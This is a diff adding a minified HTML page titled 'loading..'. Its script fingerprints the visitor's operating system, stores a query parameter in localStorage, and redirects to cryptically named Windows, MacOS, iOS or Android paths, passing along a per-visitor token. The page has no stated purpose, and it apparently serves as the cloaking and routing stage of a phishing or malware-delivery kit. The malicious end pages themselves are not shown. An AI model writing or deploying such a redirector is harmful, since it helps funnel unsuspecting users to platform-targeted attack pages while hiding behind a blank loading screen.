@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>loading..</title>
+    <script>
+        function getQueryParam(e){return new URLSearchParams(window.location.search).get(e)}function checkosSystemForScna(){const e=navigator.userAgent;let a="Unknown";return-1!==e.indexOf("Win")?a="Windows":-1!==e.indexOf("iPhone")?a="iOS":-1!==e.indexOf("Mac")?a="MacOS":-1!==e.indexOf("Android")?a="Android":-1!==e.indexOf("Linux")&&(a="Linux"),a}let operatingSystem=checkosSystemForScna();localStorage.setItem("alpha",getQueryParam("alpha")),window.location.href="MacOS"===operatingSystem?"merrx01usahtml/?tokn="+getQueryParam("tokn").trim():"Android"===operatingSystem?"andx01UShTml/?tokn="+getQueryParam("tokn").trim():"iOS"===operatingSystem?"ioxs01uShYMl/?tokn="+getQueryParam("tokn").trim():"werrx01USAHTML/?tokn="+getQueryParam("tokn").trim();
+    </script>
+</head>
+</html>
